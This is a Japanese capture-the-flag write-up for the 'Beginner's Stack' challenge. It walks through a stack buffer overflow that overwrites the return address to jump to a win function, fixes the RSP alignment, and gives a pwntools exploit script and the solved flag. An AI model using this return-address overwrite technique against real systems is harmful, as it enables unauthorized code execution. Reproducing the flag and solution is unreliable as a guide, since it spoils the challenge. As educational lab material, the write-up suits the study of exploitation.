# Beginner's Stack

プログラムを実行してみると、

* stack overflow で return address を win 関数 (0x400861) に書き換えれば flag
* return address は buf の 0x28 先に存在

ということがわかる。 stack も表示してくれてとても親切な問題。リトルエンディアンに注意して `b"A" * 40 + b"\x61\x08\x40\x00\x00\x00\x00\x00"` を送りつければよい。

…と思いきや

```
Oops! RSP is misaligned!
Some functions such as `system` use `movaps` instructions in libc-2.27 and later.
This instruction fails when RSP is not a multiple of 0x10.
Find a way to align RSP! You're almost there!
```

と返ってきた。そういえばそう。

関数最初の push によって `$rsp` の値が -8 されて 0x10 の倍数でなくなってしまうため、  `\x62\x08\x40\x00\x00\x00\x00\x00` に飛ぶ必要があった。

```python
from pwn import *

s = remote("bs.quals.beginners.seccon.jp", 9001)
s.sendlineafter(
    "Input: ",
    b"A" * 40 + b"\x62\x08\x40\x00\x00\x00\x00\x00",
)
s.interactive()
```

すると、Congratulations! と表示されたまま何もおきない。おかしいなと思って radare2 で `win` 関数が何をするかを見てみると、 `/bin/sh` を実行していた。上記スクリプトで気づかずに shell に入っていたので、 `cat flag.txt` で flag が見れた。

`ctf4b{u_r_st4ck_pwn_b3g1nn3r_tada}`